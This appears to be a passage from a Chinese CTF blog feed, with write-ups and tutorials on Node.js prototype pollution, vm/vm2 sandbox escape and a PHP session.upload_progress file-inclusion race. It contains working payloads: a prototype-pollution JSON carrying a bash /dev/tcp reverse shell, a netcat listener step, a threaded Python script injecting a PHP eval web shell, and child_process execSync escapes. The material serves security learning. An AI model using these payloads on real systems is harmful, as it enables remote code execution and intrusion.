function_\">log</span>(req.<span class=\"property\">body</span>)</span><br><span class=\"line\">        <span class=\"keyword\">var</span> body = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(req.<span class=\"property\">body</span>));</span><br><span class=\"line\">        <span class=\"keyword\">var</span> copybody = <span class=\"title function_\">clone</span>(body)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (copybody.<span class=\"property\">shit</span>) &#123;</span><br><span class=\"line\">            <span class=\"title function_\">backdoor</span>()</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;post shit ok&quot;</span>)</span><br><span class=\"line\">    &#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">        res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;is it shit ?&quot;</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(<span class=\"number\">3000</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>有 merge 原型链污染，vm2 沙箱逃逸，backdoor 方法 <code>new VM().run(&#123;&#125;.shellcode);</code>  可以利用原型链污染到 shellcode，进而 rce</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> res = <span class=\"keyword\">import</span>(<span class=\"string\">&#x27;./foo.js&#x27;</span>)</span><br><span class=\"line\">res.<span class=\"property\">toString</span>.<span class=\"title function_\">constructor</span>(<span class=\"params\"><span class=\"string\">&quot;return this&quot;</span></span>)(<span class=\"params\"></span>).<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"built_in\">require</span>(<span class=\"string\">&quot;child_process&quot;</span>).<span class=\"title function_\">execSync</span>(<span class=\"string\">&quot;whoami&quot;</span>).<span class=\"title function_\">toString</span>();</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;shit&quot;:1,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\\&quot;return this\\&quot;) ().process.mainModule.require(\\&quot;child_process\\&quot;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\&quot;&#x27;).toString();&quot;&#125;&#125; </span><br></pre></td></tr></table></figure>\n<p>注意这里反弹 shell 要有公网 ip, 先在自己的 vps 上 nc -lvp port<br>\n![[Pasted image 20230511202706.png]]</p>\n<h3 id=\"30第五空间-2021easycleanup\"><a class=\"markdownIt-Anchor\" href=\"#30第五空间-2021easycleanup\">#</a> 30.[第五空间 2021] EasyCleanup</h3>\n<p>本题考点：利用 session.upload_progress 进行文件包含，<a href=\"\"> 详解看这里</a><br>\n fuzz:<br>\nmode=eval&amp;shell=system (‘ls /’); 看根目录的所有文件名，发现 nssctfasdasdflag, 但是 shell 的长度不能超过 15 或者传 file 包含但是长度也不能超过 15, 而 nssctfasdasdflag 的长度是 16</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> io  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> threading  </span><br><span class=\"line\">sessid = <span class=\"string\">&#x27;TGAO&#x27;</span>  </span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;cmd&quot;</span>:<span class=\"string\">&quot;system(&#x27;cat /nssctfasdasdflag&#x27;);&quot;</span>&#125; <span class=\"comment\">#此处可以执行任何系统命令 </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">f = io.BytesIO(<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">1024</span> * <span class=\"number\">50</span>)  </span><br><span class=\"line\">resp = session.post( <span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28832/&#x27;</span>, data=&#123;<span class=\"string\">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class=\"string\">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class=\"string\">&#x27;file&#x27;</span>: (<span class=\"string\">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class=\"string\">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">resp = session.post(<span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28832/?file=/tmp/sess_&#x27;</span>+sessid,data=data)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;tgao.txt&#x27;</span> <span class=\"keyword\">in</span> resp.text:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(resp.text)  </span><br><span class=\"line\">event.clear()  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+++++++++++++]retry&quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:  </span><br><span class=\"line\">event=threading.Event()  </span><br><span class=\"line\"><span class=\"keyword\">with</span> requests.session() <span class=\"keyword\">as</span> session:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">30</span>):  </span><br><span class=\"line\">threading.Thread(target=write,args=(session,)).start()  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">30</span>):  </span><br><span class=\"line\">threading.Thread(target=read,args=(session,)).start()  </span><br><span class=\"line\">event.<span class=\"built_in\">set</span>()</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/",
            "url": "https://hq185187.github.io/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/",
            "title": "沙箱逃逸初学习",
            "date_published": "2023-05-12T08:09:54.871Z",
            "content_html": "<h2 id=\"初识\"><a class=\"markdownIt-Anchor\" href=\"#初识\">#</a> 初识</h2>\n<ul>\n<li>JavaScript 和 nodejs 的区别：JavaScript 是前端语言，后来将 Chrome 中的 v8 引擎单独拿出来为 JavaScript 单独开发了一个运行环境，因此 JavaScript 也可以作为一门后端语言，写在后端（服务端）的 JavaScript 就叫叫做 Nodejs。</li>\n<li>沙箱：单独开辟一个运行代码的环境，与主机隔离，可用来运行危险代码且不影响主机，依靠重定向将代码重定向到沙箱内部</li>\n<li>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox 和 VM 使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker 属于 sandbox 的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。</li>\n<li>在 nodejs 中可以通过 vm 模块创建一个沙箱但有缺陷</li>\n</ul>\n<h2 id=\"node将字符串执行为代码\"><a class=\"markdownIt-Anchor\" href=\"#node将字符串执行为代码\">#</a> node 将字符串执行为代码</h2>\n<h3 id=\"方法1eval\"><a class=\"markdownIt-Anchor\" href=\"#方法1eval\">#</a> 方法 1：eval</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.txt</span><br><span class=\"line\">var name=&#x27;web&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">//1.js</span><br><span class=\"line\">const fs=require(&#x27;fs&#x27;);//通过require引入fs模块(内置文件操作函数)</span><br><span class=\"line\">let content=fs.readFileSync(&#x27;1.txt&#x27;,&#x27;utf-8&#x27;);</span><br><span class=\"line\">console.log(content);//var name=&#x27;web&#x27;</span><br><span class=\"line\">eval(content);</span><br><span class=\"line\">console.log(name);//web</span><br></pre></td></tr></table></figure>\n<p>此方法可能因为作用域原因报错</p>\n<h3 id=\"方法2new-function\"><a class=\"markdownIt-Anchor\" href=\"#方法2new-function\">#</a> 方法 2：new function ()</h3>\n<p>第一个参数是形参名，第二个参数是函数体</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var name=&#x27;web&#x27;;</span><br><span class=\"line\">var a=new function(&#x27;name&#x27;,&#x27;return &quot;hello &quot;+name&#x27;);</span><br><span class=\"line\">console.log(a(namme));</span><br><span class=\"line\">//hello web</span><br></pre></td></tr></table></figure>\n<h2 id=\"nodejs作用域\"><a class=\"markdownIt-Anchor\" href=\"#nodejs作用域\">#</a> nodejs 作用域</h2>\n<p>nodejs 中作用域 1 叫上下文<br>\n node 项目中导入的包是不互通的<br>\n eg, 假设 1.js 和 2.js 在同一级目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.js</span><br><span class=\"line\">var age=19;</span><br><span class=\"line\">//2.js</span><br><span class=\"line\">const a=require(&#x27;./1.js&#x27;);</span><br><span class=\"line\">console.log(age);</span><br><span class=\"line\">//此时age值为undefined</span><br></pre></td></tr></table></figure>\n<ol>\n<li>exports: 将 js 文件中的属性输出的接口</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.js</span><br><span class=\"line\">var age=19;</span><br><span class=\"line\">exports.age=age;</span><br></pre></td></tr></table></figure>\n<p>此时可以输出 age，值为 19<br>\n2. 定义全局对象 global</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.js</span><br><span class=\"line\">global age=19;</span><br></pre></td></tr></table></figure>\n<p>此时不管在哪里 console.log (age) 就是 19</p>\n<h2 id=\"vm沙箱逃逸\"><a class=\"markdownIt-Anchor\" href=\"#vm沙箱逃逸\">#</a> vm 沙箱逃逸</h2>\n<p>实现沙箱的隔离效果，要创建一个隔离的环境，此时需要用到 vm 模块</p>\n<h3 id=\"常见api\"><a class=\"markdownIt-Anchor\" href=\"#常见api\">#</a> 常见 api：</h3>\n<p>官方文档：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubm9kZWFwcC5jbi92bS5odG1sI3ZtX3ZtX2NyZWF0ZWNvbnRleHRfc2FuZGJveA==\">vm</span><br>\nvm.Script 类：</p>\n<ol>\n<li>new  vm.Script (code,options): 创建一个新的 vm.Script 对象，将接受的代码预编译不执行，此<br>\n后可被多次执行</li>\n<li>script.runInContext (contextifiedSandbox,options), 在指定的 <code>contextifiedSandbox</code>  中执行 <code>vm.Script</code>  对象中被编译后的代码并返回其结果，其中 contextifiedSanbox 是由 vm.createContext 返回的对象</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> util = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;util&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> vm = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> sandbox = &#123;</span><br><span class=\"line\">  <span class=\"attr\">animal</span>: <span class=\"string\">&#x27;cat&#x27;</span>,</span><br><span class=\"line\">  <span class=\"attr\">count</span>: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> script = <span class=\"keyword\">new</span> vm.<span class=\"title class_\">Script</span>(<span class=\"string\">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> context = vm.<span class=\"title function_\">createContext</span>(sandbox);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ++i) &#123;</span><br><span class=\"line\">  script.<span class=\"title function_\">runInContext</span>(context);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(util.<span class=\"title function_\">inspect</span>(sandbox));</span><br><span class=\"line\"><span class=\"comment\">//&#123;&#x27;animal&#x27;:&#x27;cat&#x27;,&#x27;count&#x27;:12,&#x27;name&#x27;:&#x27;kitty&#x27;&#125;</span></span><br></pre></td></tr></table></figure>\n<p><code>vm.runinThisContext(code)</code> : 在当前 global 下创建一个作用域 (sandbox), 将接收的参数当做代码执行，sanbox 里可以访问外面 global 的属性，不能访问其他包的属性</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> vm=<span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> test=<span class=\"string\">&#x27;local&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> vmresult=vm.<span class=\"title function_\">runinThisContext</span>(<span class=\"string\">&#x27;test=&#x27;</span>vm<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(vmresult);<span class=\"comment\">//vm</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(test);<span class=\"comment\">//local</span></span><br></pre></td></tr></table></figure>\n<p><code>vm.createContext([sandbox])</code> ： 给定一个 <code>sandbox</code>  对象，  <code>vm.createContext()</code>  会设置此 <code>sandbox</code> ，从而让它具备在 <code>vm.runInContext()</code>  或者 <code>script.runInContext()</code>  中被使用的能力。</p>\n<p><code>vm.runInContext()</code> : 在指定的 <code>contextifiedSandbox</code>  的上下文里执行 vm.Script 对象中被编译后的代码并返回其结果。被执行的代码无法获取本地作用域。</p>\n<h2 id=\"process实现rce\"><a class=\"markdownIt-Anchor\" href=\"#process实现rce\">#</a> process 实现 rce</h2>\n<p>在获取到 process 对象后我们就可以用 require 来导入 child_process，再利用 child_process 执行命令。但 process 挂载在 global 上，但是我们上面说了在 <code>creatContext</code>  后是不能访问到 global 的，所以我们最终的目标是通过各种办法将 global 上的 process 引入到沙箱中。</p>\n<p>vm.runInNewContext( <code>this.constructor.constructor('return process.env')()</code> );</p>\n<p>那么我们是怎么实现逃逸的呢，首先这里面的 this 指向的是当前传递给 <code>runInNewContext</code>  的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为 Function 的 constructor），最后的 <code>()</code>  是调用这个用 Function 的 constructor 生成的函数，最终返回了一个 process 对象</p>\n<p>下面这行代码也可以达到相同的效果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const y1 = vm.runInNewContext(this.toString.constructor(&#x27;return process&#x27;)());</span><br></pre></td></tr></table></figure>\n<p>然后我们就可以通过返回的 process 对象来 rce 了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">y1.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br></pre></td></tr></table></figure>\n<p>参考:<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE4NTkjdG9jLTk=\">1.</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "url": "https://hq185187.github.io/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "title": "原型链污染",
            "date_published": "2023-05-10T15:07:02.584Z",
            "content_html": "<h2 id=\"一什么是原型对象\"><a class=\"markdownIt-Anchor\" href=\"#一什么是原型对象\">#</a> 一。什么是原型对象</h2>\n<p>我们知道在 JavaScript 中，一个已经存在构造器的对象中是不能添加新的属性的，但是可以通过 prototype 继承添加</p>\n<h3 id=\"eg添加属性和方法\"><a class=\"markdownIt-Anchor\" href=\"#eg添加属性和方法\">#</a> eg 添加属性和方法</h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Person</span>(<span class=\"params\">first,last,age</span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>=first;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">lastname</span>=last;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">age</span>=age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">nationality</span>=<span class=\"string\">&#x27;Chinese&#x27;</span><span class=\"comment\">//添加一个国籍属性</span></span><br><span class=\"line\"><span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">name</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"variable language_\">this</span>.<span class=\"property\">lastname</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//添加一个方法名字为name</span></span><br><span class=\"line\"><span class=\"comment\">//调用次方法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> myFather = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;John&quot;</span>, <span class=\"string\">&quot;Doe&quot;</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;demo&quot;</span>).<span class=\"property\">innerHTML</span> =</span><br><span class=\"line\"><span class=\"string\">&quot;我的父亲是 &quot;</span> + myFather.<span class=\"title function_\">name</span>();</span><br></pre></td></tr></table></figure>\n<h3 id=\"为什么\"><a class=\"markdownIt-Anchor\" href=\"#为什么\">#</a> 为什么？</h3>\n<p>所有的 JavaScript 对象都会从一个 prototype (原型对象) 中继承属性和方法.JavaScript 对象有一个指向一个原型对象的链，当访问一个对象的属性时，不仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象原型的原型，直到找到属性或者末尾.</p>\n<h2 id=\"二proto和prototype用法\"><a class=\"markdownIt-Anchor\" href=\"#二proto和prototype用法\">#</a> 二.proto 和 prototype 用法</h2>\n<p>对象.proto = 构造器 (构造函数).prototype<br>\neg</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Foo</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">bar</span>=<span class=\"number\">1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">Foo</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">show</span>=<span class=\"keyword\">function</span> <span class=\"title function_\">show</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">bar</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> foo=<span class=\"keyword\">new</span> <span class=\"title class_\">Foo</span>()</span><br><span class=\"line\">foo.<span class=\"title function_\">show</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">foo.<span class=\"property\">__proto__</span>==<span class=\"title class_\">Foo</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span></span><br></pre></td></tr></table></figure>\n<p>原型链是什么？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__proto__是任何对象都有的属性,而js里万物皆对象,所以会形成一条__proto__连起来的链子,递归访问__proto__最终到头,并且值是null</span><br><span class=\"line\">总结:</span><br></pre></td></tr></table></figure>\n<p>总结:<br>\nprototype 是一个类的属性，所有类对象在实例化的时候将会拥有 prototype 中的属性和方法，一个对象 (foo) 的 <code>__proto__</code> 属性，指向这个对象所在的类 (Foo) 的 prototype 属性<br>\n eg</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Father</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>=<span class=\"string\">&#x27;Donald&#x27;</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">lastname</span>=<span class=\"string\">&#x27;Trump&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Son</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>=<span class=\"string\">&#x27;Melania&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">Son</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Father</span>()</span><br><span class=\"line\"><span class=\"keyword\">let</span> son=<span class=\"keyword\">new</span> <span class=\"title class_\">Son</span>()</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title class_\">Name</span>:$&#123;son.<span class=\"property\">firstname</span>&#125; $&#123;son.<span class=\"property\">lastname</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//查看原型对象的构造器</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title class_\">Father</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">constructor</span>===<span class=\"title class_\">Father</span>)<span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>输出：Melania Trump<br>\n 调用 son 的 lastname 时，先在 Son 找 lastname 发现没有就去找 son.<strong>proto</strong>, 指向 Son.prototype, 成功继承父类的 lastname</p>\n<h2 id=\"三原型链污染原理\"><a class=\"markdownIt-Anchor\" href=\"#三原型链污染原理\">#</a> 三。原型链污染原理</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> baseObj = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">getName</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"string\">&#x27;I am a base object&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">const</span> maliciousObj = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"attr\">getName</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"string\">&#x27;I am a malicious object&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">   maliciousObj.<span class=\"property\">__proto__</span> = baseObj; <span class=\"comment\">// 修改原型对象为 baseObj</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">const</span> normalObj = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">//console.log(normalObj.getName()); // 输出：Uncaught TypeError: normalObj.getName is not 